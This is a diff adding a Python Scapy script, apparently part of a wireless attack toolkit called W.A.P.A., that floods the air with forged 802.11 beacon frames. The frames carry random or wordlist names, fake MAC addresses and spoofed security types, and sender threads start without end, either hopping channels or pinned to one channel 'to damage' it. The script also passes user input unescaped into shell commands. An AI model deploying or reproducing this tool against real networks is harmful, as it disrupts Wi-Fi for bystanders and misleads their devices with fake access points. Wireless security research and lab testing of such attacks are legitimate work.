@@ -1,0 +1,219 @@
+#!/usr/bin/python3
+#
+#     Beacon Flood / Fuzzer
+#          -- W.A.P.A. --
+#
+from scapy.all import *
+import argparse
+import os, sys
+from time import sleep
+import string
+import random
+import subprocess
+
+#Argparse formatter
+class SmartFormatter(argparse.HelpFormatter):
+        def _split_lines(self, text, width):
+                if text.startswith('R|'):
+                        return text[2:].splitlines()
+                return argparse.HelpFormatter._split_lines(self, text, width)
+
+#Variables
+verb = 0
+wordlist = 0
+do_channel_hop = 0
+sys.tracebacklimit=0
+
+#Arguments
+parser = argparse.ArgumentParser(formatter_class=SmartFormatter)
+parser.add_argument("interface", help="R|Interface to use")
+parser.add_argument("-f", help="R|Specify a file to use as wordlist")
+parser.add_argument("-c", "--channel", help="R|Disable channel hopping to execute the program in <CHANNEL>\n"
+"It's recommended to use this flag in order to damage the channel specified")
+parser.add_argument("-v", help="R|Verbosity", action="store_true")
+args = parser.parse_args()
+intf = args.interface
+
+#Arg check
+if args.f is not None:
+	wordlist = 1
+
+if args.v is True:
+	verb = 1
+
+if args.channel is None:
+	do_channel_hop = 1
+else:
+	os.system(f"iwconfig {intf} channel {args.channel}")
+
+#Iterate thru wordlist
+if wordlist == 1:
+	wordlist_path = args.f
+	num_lines_cmd = ("cat %s | wc -l"% wordlist_path)
+	num_lines = int(subprocess.check_output(num_lines_cmd, shell=True))
+	linenum = num_lines + 1
+	n = 1
+
+#Func
+def random_essid():
+	charset =  string.digits + string.digits + string.ascii_lowercase + string.digits + " %*^{}"
+	return ''.join(random.sample(charset*6, 32))
+
+def channel_hop():
+	chan = 1
+	while True:
+		os.system(f"iwconfig {intf} channel {chan}")
+		chan = chan % 14 + 1
+		sleep(0.5)
+
+#Pre-script // perform channel hop if required
+if do_channel_hop == 1:
+	chan_hopper = threading.Thread(target=channel_hop,daemon=True)
+	chan_hopper.start()
+
+#Script
+if wordlist == 0:
+	while True:
+		currchan_cmd = ("iwlist %s channel | grep -i current | awk '{print $5}'"% intf)
+		currchan_sprcs = str(subprocess.check_output(currchan_cmd,shell=True,text=True))
+		currchan_parse1 = currchan_sprcs.strip()
+		currchan = currchan_parse1.replace(')', '')
+		cols = int(subprocess.check_output("tput cols", shell=True))
+		essid_name = random_essid()
+		bssid_mac = str(RandMAC())
+		dst = "ff:ff:ff:ff:ff:ff"
+		# Packet crafting
+		essid = Dot11Elt(ID="SSID",info=essid_name,len=len(essid_name))
+		dsset = Dot11Elt(ID="DSset",info="\x01")
+		tim = Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
+		rates = Dot11Elt(ID="Rates",info="\x03\x12\x96\x18\x24\x30\x48\x60")
+		rand_sec = random.randrange(0,5)
+		if rand_sec == 0:
+			# OPN AP
+			beacon = Dot11Beacon(cap="ESS")
+			rsn=""
+			secur = "OPN"
+		elif rand_sec == 1:
+			# WEP AP
+			beacon = Dot11Beacon(cap="ESS+privacy")
+			rsn=""
+			secur = "WEP"
+		elif rand_sec == 2: # WPA
+			secur = "WPA"
+			beacon = Dot11Beacon(cap="ESS+privacy")
+			rsn = Dot11Elt(ID="RSNinfo", info=(
+			"\x01\x00"              # RSN v1
+			"\x00\x0f\xac\x02"      # Cifrado
+			"\x02\x00"              # PCS (2)
+			"\x00\x0f\xac\x04"      # AES
+			"\x00\x0f\xac\x02"      # TKIP
+			"\x01\x00"              # Auth key mgmnt
+			"\x00\x0f\xac\x02"      # PSK
+			"\x00\x00"))            # RSN (no extras)
+		else: # WPA2
+			secur = "WPA2"
+			beacon = Dot11Beacon(cap="ESS+privacy")
+			rsn = Dot11Elt(ID="RSNinfo", info=(
+			"\x01\x00"              # RSN v1
+			"\x00\x0f\xac\x02"      # Group Cipher Suite : 00-0f-ac TKIP
+			"\x02\x00"              # 2 Pairwise Cipher Suites
+			"\x00\x0f\xac\x04"      # AES
+			"\x00\x0f\xac\x02"      # TKIP
+			"\x01\x00"              # Auth key mgmnt
+			"\x00\x0f\xac\x02"      # PSK
+			"\x00\x00"))            # RSN (no extras)
+
+		if verb:
+			print("")
+			print(u'\u2500'*cols + "\n")
+			print("[*] Generated AP with this information:")
+			print("    - BSSID: " + bssid_mac)
+			print("    - ESSID: " + essid_name)
+			print("    - Security: " + secur )
+			print("")
+			print("    - Currently working on channel " + currchan)
+			print("")
+			print("[+] Sending beacons...")
+
+		pkt = RadioTap()/Dot11(proto=0,type=0,subtype=8,addr1=dst,addr2=bssid_mac,addr3=bssid_mac)/beacon/essid/rsn/rates/dsset/tim
+		#threading.Thread(sendp(pkt,iface=intf,count=100,inter=0.25,verbose=0)) #ver como meterle hilos a esto?????????
+		def send_packets():
+			sendp(pkt,iface=intf,count=-1,inter=0.25,verbose=0)
+		sender_thread = threading.Thread(group=None,target=send_packets,daemon=True)
+		sender_thread.start()
+		sleep(2)
+elif wordlist == 1:
+	while True:
+		currchan_cmd = ("iwlist %s channel | grep -i current | awk '{print $5}'"% intf)
+		currchan_sprcs = str(subprocess.check_output(currchan_cmd,shell=True,text=True))
+		currchan_parse1 = currchan_sprcs.strip()
+		currchan = currchan_parse1.replace(')', '')
+		cols = int(subprocess.check_output("tput cols", shell=True))
+		essid_cmd = ("awk '{if(NR==%s) print $0}' %s"% (n, wordlist_path))
+		essid_subp = str(subprocess.check_output(essid_cmd,shell=True,text=True))
+		essid_name = essid_subp.strip()
+		bssid_mac = str(RandMAC())
+		dst = "ff:ff:ff:ff:ff:ff"
+		# Packet crafting
+		essid = Dot11Elt(ID="SSID",info=essid_name,len=len(essid_name))
+		dsset = Dot11Elt(ID="DSset",info="\x01")
+		tim = Dot11Elt(ID="TIM",info="\x00\x01\x00\x00")
+		rates = Dot11Elt(ID="Rates",info="\x03\x12\x96\x18\x24\x30\x48\x60")
+		rand_sec = random.randrange(0,5)
+		if rand_sec == 0:
+			# OPN AP
+			beacon = Dot11Beacon(cap="ESS")
+			rsn=""
+			secur = "OPN"
+		elif rand_sec == 1:
+			# WEP AP
+			beacon = Dot11Beacon(cap="ESS+privacy")
+			rsn=""
+			secur = "WEP"
+		elif rand_sec == 2: # WPA
+			secur = "WPA"
+			beacon = Dot11Beacon(cap="ESS+privacy")
+			rsn = Dot11Elt(ID="RSNinfo", info=(
+			"\x01\x00"              # RSN v1
+			"\x00\x0f\xac\x02"      # Cifrado
+			"\x02\x00"              # PCS (2)
+			"\x00\x0f\xac\x04"      # AES
+			"\x00\x0f\xac\x02"      # TKIP
+			"\x01\x00"              # Auth key mgmnt
+			"\x00\x0f\xac\x02"      # PSK
+			"\x00\x00"))            # RSN (no extras)
+		else: # WPA2
+			secur = "WPA2"
+			beacon = Dot11Beacon(cap="ESS+privacy")
+			rsn = Dot11Elt(ID="RSNinfo", info=(
+			"\x01\x00"              # RSN v1
+			"\x00\x0f\xac\x02"      # Group Cipher Suite : 00-0f-ac TKIP
+			"\x02\x00"              # 2 Pairwise Cipher Suites
+			"\x00\x0f\xac\x04"      # AES
+			"\x00\x0f\xac\x02"      # TKIP
+			"\x01\x00"              # Auth key mgmnt
+			"\x00\x0f\xac\x02"      # PSK
+			"\x00\x00"))            # RSN (no extras)
+
+		if verb:
+			print("")
+			print(u'\u2500'*cols + "\n")
+			print("[*] Generated AP with this information:")
+			print("    - BSSID: " + bssid_mac)
+			print("    - ESSID: " + essid_name)
+			print("    - Security: " + secur )
+			print("")
+			print("    - Currently working on channel " + currchan)
+			print("")
+			print("[+] Sending beacons...")
+
+		pkt = RadioTap()/Dot11(proto=0,type=0,subtype=8,addr1=dst,addr2=bssid_mac,addr3=bssid_mac)/beacon/essid/rsn/rates/dsset/tim
+		def send_packets_wlst():
+			sendp(pkt,iface=intf,count=-1,inter=0.25,verbose=0)
+		sender_thread = threading.Thread(group=None,target=send_packets_wlst,daemon=True)
+		sender_thread.start()
+		if n == num_lines:
+			n = 1
+		else:
+			n += 1
+		sleep(2)
